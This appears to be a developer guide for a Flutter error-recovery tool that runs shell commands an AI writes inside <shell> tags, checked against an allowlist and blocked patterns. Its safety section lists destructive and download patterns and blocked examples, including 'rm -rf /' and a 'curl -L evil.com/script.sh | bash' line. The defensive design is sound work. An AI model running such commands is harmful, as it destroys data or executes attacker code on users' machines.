# Shell Command Integration Guide

## Overview

The enhanced recovery system now supports automatic execution of shell commands from AI responses using `<shell>` tags. This provides a much simpler and more flexible approach than predefined command lists.

## How It Works

### 1. AI Response with Shell Commands

When the AI analyzes errors, it can include shell commands wrapped in `<shell>` tags:

```
Based on the analysis, I need to resolve dependency issues:

<shell description="Update dependencies to resolve import errors">flutter pub get</shell>

Then generate missing files:
<shell description="Generate missing .g.dart files">flutter packages pub run build_runner build</shell>

Now I'll fix the remaining code issues by adding the missing import:
```dart
import 'package:flutter/material.dart';
```
```

### 2. Automatic Parsing and Execution

The system automatically:
1. **Parses** `<shell>` tags from AI responses
2. **Validates** commands for safety
3. **Executes** them in sequence  
4. **Logs** all results with timing and output
5. **Continues** with code fixes if provided

## Shell Tag Syntax

### Basic Syntax
```html
<shell>flutter pub get</shell>
```

### With Description
```html
<shell description="Update dependencies to fix import errors">flutter pub get</shell>
```

### Multi-line (first non-comment line is executed)
```html
<shell description="Generate code">
# This will generate missing .g.dart files
flutter packages pub run build_runner build
</shell>
```

## Safety Features

### Whitelisted Commands
Only these command prefixes are allowed:
- `flutter` - Flutter CLI commands
- `dart` - Dart CLI commands  
- `npm` - Node package manager
- `yarn` - Yarn package manager
- `git` - Git commands
- `ls`, `pwd`, `echo`, `cat`, `grep`, `find` - Basic utilities

### Blocked Patterns
These dangerous patterns are automatically blocked:
- `rm -rf` - Recursive deletion
- `sudo` - Privilege escalation
- `wget`, `curl -L` - Downloads
- `>`, `|`, `&&`, `||`, `;` - Output redirection and chaining
- `` ` ``, `$(` - Command substitution

### Example Safety Checks
```
✅ SAFE: flutter pub get
✅ SAFE: dart analyze  
❌ BLOCKED: rm -rf /
❌ BLOCKED: sudo apt install malware
❌ BLOCKED: curl -L evil.com/script.sh | bash
```

## Integration with Recovery System

### In Error Recovery Process

1. **AI Analysis**: AI analyzes dart analyze output
2. **Command Identification**: AI determines needed commands
3. **Shell Tag Generation**: AI includes `<shell>` tags in response
4. **Automatic Execution**: System parses and runs commands
5. **Code Fixes**: AI provides targeted code fixes
6. **Validation**: System re-runs dart analyze to check progress

### Example Recovery Flow

```
🔧 Starting Comprehensive Error Recovery
🔍 Running Comprehensive Dart Analysis - Found 15 errors

AI Response:
"I need to resolve import errors first:
<shell>flutter pub get</shell>

Then generate missing model files:
<shell>flutter packages pub run build_runner build</shell>

Now I'll fix the remaining type issues with these changes:
..."

✅ flutter pub get (3.2s) - Resolved import dependencies
✅ build_runner build (12.8s) - Generated 3 .g.dart files  
🔧 Applying 4 targeted code fixes
✅ Error Recovery Successful! (18.3s)
```

## Usage Examples

### For Dependency Issues
```html
<shell description="Update dependencies">flutter pub get</shell>
<shell description="Add missing HTTP package">flutter pub add http</shell>
```

### For Generated Code Issues  
```html
<shell description="Generate missing .g.dart files">flutter packages pub run build_runner build</shell>
<shell description="Clean generated files first">flutter packages pub run build_runner clean</shell>
```

### For Code Quality Issues
```html
<shell description="Fix code formatting">dart format .</shell>
<shell description="Apply automatic lint fixes">dart fix --apply</shell>
```

### For Build Issues
```html
<shell description="Clean build cache">flutter clean</shell>
<shell description="Get dependencies after clean">flutter pub get</shell>
```

## Testing the System

### Test with Error Introduction
Use the test prompts in `TEST_ERROR_PROMPTS.md` to introduce errors, then watch the recovery:

```bash
# Introduce errors with AI assistant using the prompts
# Then trigger recovery
curl -X POST http://localhost:5000/api/hot-reload
```

### Manual Testing
```python
from code_modification.shell_command_parser import ShellCommandParser
import asyncio

async def test():
    parser = ShellCommandParser("./project", enable_execution=False)  # Dry run
    
    ai_response = """
    I'll fix the import errors:
    <shell description="Update dependencies">flutter pub get</shell>
    """
    
    commands, executions = await parser.parse_and_execute(ai_response)
    print(f"Executed {len(commands)} commands")
    for execution in executions:
        print(f"  {execution.command}: {'✅' if execution.success else '❌'}")

asyncio.run(test())
```

## Configuration Options

### Enable/Disable Execution
```python
# Enable shell command execution
parser = ShellCommandParser("./project", enable_execution=True)

# Dry run mode (parsing only)
parser = ShellCommandParser("./project", enable_execution=False)
```

### Modify Allowed Commands
```python
# Add custom allowed commands
parser.allowed_commands.extend(["make", "cargo", "go"])
```

## Logging and Monitoring

### Command Execution Logs
Every command execution creates detailed logs:
```json
{
  "timestamp": "2025-06-22T18:12:34.227132",
  "command": "flutter pub get",
  "success": true,
  "exit_code": 0,
  "execution_time": 3.2,
  "description": "Update dependencies to resolve import errors",
  "stdout_length": 245,
  "stderr_length": 0
}
```

### Real-time Progress
Users see command execution in real-time:
```
🔧 Starting Comprehensive Error Recovery
✅ flutter pub get (3.2s) - Update dependencies to resolve import errors
✅ build_runner build (12.8s) - Generate missing .g.dart files
🔧 Applying targeted code fixes...
✅ Error Recovery Successful!
```

## Best Practices for AI Responses

### 1. Use Descriptive Tags
```html
<!-- Good -->
<shell description="Update dependencies to fix import errors">flutter pub get</shell>

<!-- Less clear -->
<shell>flutter pub get</shell>
```

### 2. Order Commands Logically
```html
<!-- Dependencies first -->
<shell description="Update dependencies">flutter pub get</shell>

<!-- Then code generation -->
<shell description="Generate missing files">flutter packages pub run build_runner build</shell>

<!-- Finally formatting -->
<shell description="Format code">dart format .</shell>
```

### 3. Combine with Code Fixes
```
First I'll resolve the dependency issues:
<shell description="Update dependencies">flutter pub get</shell>

Now I'll fix the remaining import errors by adding:
```dart
import 'package:flutter/material.dart';
```
```

### 4. Use for Appropriate Error Types
- **Import/Dependency Errors** → `flutter pub get`, `flutter pub add`
- **Generated Code Issues** → `build_runner build`
- **Formatting Issues** → `dart format .`
- **Linting Issues** → `dart fix --apply`
- **Build Problems** → `flutter clean`

## Error Handling

### Command Failures
If a command fails, the system:
1. **Logs the failure** with error details
2. **Continues** with remaining commands
3. **Reports** the failure in the summary
4. **Attempts** code fixes regardless

### Safety Violations
If a command is blocked for safety:
1. **Logs the violation** with reason
2. **Skips** the dangerous command
3. **Continues** with safe commands
4. **Reports** the blocking in logs

## Integration Points

### In DartAnalysisFixer
The `DartAnalysisFixer` automatically uses shell command parsing:
```python
# Shell commands are parsed and executed from AI responses
shell_commands, shell_executions = await self.shell_parser.parse_and_execute(response.text)

# Results are logged and tracked
for execution in shell_executions:
    self.logger.log_command_execution(fake_result, "AI-suggested shell command")
```

### In Enhanced Prompts
All prompts now encourage shell command usage:
```yaml
## Shell Command Execution
When you identify commands that should be executed, wrap them in `<shell>` tags:

<shell description="Update dependencies">flutter pub get</shell>
<shell description="Generate missing files">flutter packages pub run build_runner build</shell>
```

## Conclusion

The shell command integration provides a much more flexible and powerful approach to error recovery. Instead of predefined command logic, the AI can intelligently determine and execute the exact commands needed for each specific error scenario.

This approach is:
- **More Flexible**: AI decides which commands to run
- **Safer**: Comprehensive safety validation
- **More Observable**: Complete logging of all executions  
- **Simpler**: No need to maintain complex command mapping logic
- **More Effective**: Commands can be tailored to specific error patterns

The system maintains safety through whitelisting and pattern blocking while giving the AI the flexibility to execute the right commands at the right time.